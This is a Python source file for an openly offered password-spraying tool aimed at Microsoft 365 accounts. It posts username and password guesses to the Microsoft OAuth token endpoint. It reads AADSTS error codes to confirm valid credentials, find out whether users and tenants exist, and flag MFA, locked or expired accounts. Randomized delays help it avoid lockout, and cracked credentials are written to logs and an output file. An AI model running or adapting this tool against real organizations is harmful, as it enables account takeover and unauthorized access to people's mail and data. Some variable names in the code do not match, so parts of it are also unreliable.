import requests
import time
import sys
import random
import logging

class TextColor:
  RED = '\033[91m'
  GREEN = '\033[92m'
  YELLOW = '\033[93m'
  BLUE = '\033[94m'
  MAGENTA = '\033[95m'
  CYAN = '\033[96m'
  RESET = '\033[0m'  # Reset to default color

logging.basicConfig(filename='logs.txt',level=logging.INFO,
                    format='%(asctime)s:%(levelname)s:%(message)s',datefmt='%d/%m/%Y %H:%M:%S %p')
   
class sprayAttack(TextColor):
  url = "https://login.microsoft.com/common/oauth2/token"
  header = {
      "Accept": "application/json",
      "Content-Type": "application/x-www-form-urlencoded"
    }
  def __init__(self,threshold,output=None):
    self.full_result = []
    self.output = output
    self.threshold = threshold 
    logging.info(f'[+] Threshold set to {self.threshold}')

  @staticmethod
  def banner():
    banner = TextColor.BLUE + """
        ██████╗░░█████╗░██╗░░░██╗██████╗░
        ██╔══██╗██╔══██╗██║░░░██║██╔══██╗
        ██║░░██║██║░░██║██║░░░██║██████╔╝
        ██║░░██║██║░░██║██║░░░██║██╔══██╗
        ██████╔╝╚█████╔╝╚██████╔╝██║░░██║
        ╚═════╝░░╚════╝░░╚═════╝░╚═╝░░╚═╝
        
        [O365 SprayMaster] 
        O365 Password Spray Atack Tool
        By Vishal Raj
        """ + TextColor.RESET
    print(banner)
  
  def passwordSpray(self, user, password):
    self.user = user
    self.password = password
    self.delay = 0
    if self.threshold == 'slow': self.delay = random.uniform(30,60)
    elif self.threshold == 'medium': self.delay = random.uniform(15,30)
    elif self.threshold == 'fast': self.delay = random.uniform(5,15)
    elif self.threshold == 'veryfast': self.delay = 0

    self.payload = {
      "resource": "https://graph.windows.net",
      "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
      "client_info": "1",
      "grant_type": "password",
      "username": self.user,
      "password": self.password,
      "scope": "openid"
  }
    try:
      print(TextColor.CYAN + f"Verifying credentials for user: {self.user} with password: {self.password}" + TextColor.RESET)
      logging.info(f"[+] Verifying credentials for user: {self.user} with password: {self.password}")
      self.response = requests.post(sprayAttack.url, headers=sprayAttack.header, data=self.payload)
      if self.response.status_code == 200:
        print(TextColor.GREEN + f"[+]Credentials found successfully! {self.user}:{self.password}" + TextColor.RESET)
        logging.info(f"[+] Authentication successful for user: {self.user}")
        self.full_result.append(f"[+]Credentials found successfully for User! {self.user}:{self.password}")
      else:
        resp_err = self.response.text
        logging.error("[-] Authentication failed for user: {self.user} with password: {self.password}")
        #Reference list of all the Azure AD Authentication and Authorization Error Code: https://bit.ly/3yH8mXd
        if "AADSTS50126" in resp_err:
            print(TextColor.RED + f"[-] Invalid Password for user:{self.user}:{self.password}" + TextColor.RESET)
            logging.error(f"[-] Invalid Password for user:{self.user}:{self.password}")

        elif "AADSTS50128" in resp_err or "AADSTS50059" in resp_err:
            print(TextColor.YELLOW + f"[*] WARNING! Tenant for account {self.user} doesn't exist. Check the domain to make sure they are using Azure/O365 services." + TextColor.RESET)
            logging.warning(f"[*] WARNING! Tenant for account {self.user} doesn't exist")

        elif "AADSTS50034" in resp_err:
            print(TextColor.YELLOW + f"[*] WARNING! The user {self.user} doesn't exist." + TextColor.RESET)
            logging.warning(f"[*] WARNING! The user {self.user} doesn't exist.")

        elif "AADSTS50079" in resp_err or "AADSTS50076" in resp_err:
            print(TextColor.MAGENTA + f"[+] SUCCESS! {self.user} : {self.password} - NOTE: The response indicates MFA (Microsoft) is in use." + TextColor.RESET)
            self.full_results.append(f"{self.user} : {self.password} - NOTE: The response indicates MFA (Microsoft) is in use.")
            logging.info(f"[+] SUCCESS! {self.user} : {self.password} - NOTE: The response indicates MFA (Microsoft) is in use.")

        elif "AADSTS50158" in resp_err:
            print(TextColor.MAGENTA + f"[+] SUCCESS! {self.user} : {self.password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use." + TextColor.RESET)
            logging.info(f"[+] SUCCESS! {self.user} : {self.password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.")
            self.full_results.append(f"{self.user} : {self.password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.")

        elif "AADSTS50053" in resp_err:
            print(TextColor.YELLOW + f"[*] WARNING! The account {self.user} appears to be locked." + TextColor.RESET)
            logging.warning(f"[*] WARNING! The account {self.user} appears to be locked.")

        elif "AADSTS50057" in resp_err:
            print(TextColor.YELLOW + f"[*] WARNING! The account {self.user} appears to be disabled." + TextColor.RESET)
            logging.warning(f"[*] WARNING! The account {self.user} appears to be desabled.")

        elif "AADSTS50055" in resp_err:
            print(TextColor.MAGENTA + f"[+] SUCCESS! {self.user} : {self.password} - NOTE: The user's password is expired." + TextColor.RESET)
            self.full_results.append(f"{self.user} : {self.password} - NOTE: The user's password is expired.")
            logging.info(f"[+] SUCCESS! {self.user} : {self.password} - NOTE: The user's password is expired.")
            
        else:
            print(TextColor.RED + f"[-] Got an error without AADSTS error codes {self.user}" + TextColor.RESET)
            print(resp_err)

      if self.threshold != "veryfast":
        print(TextColor.YELLOW + f"\n[*] Waiting for {self.delay:.2f} seconds before the next request..." + TextColor.RESET)
        time.sleep(self.delay)
          
    except requests.RequestException as msg:
      print(f"Error occure: {msg}")
      logging.exception(msg)
      sys.exit(-1)
    except KeyboardInterrupt as msg:
      print("\nKeybord Intruption:\nQuitting the process....")
      logging.exception(msg)
      time.sleep(1)
      if self.output:
        if self.full_result:
          with open(self.output,'a')as file:
            for result in self.full_result:
                file.write(result + "\n")  
          print(TextColor.GREEN + f"[+] Results have been written to {self.output}." + TextColor.RESET)
          logging.info(f"[+] Result save in {self.output}")
          logging.info('[+] Script Stop')
        else: pass
      sys.exit(-1)

if __name__ == "__main__":
  pass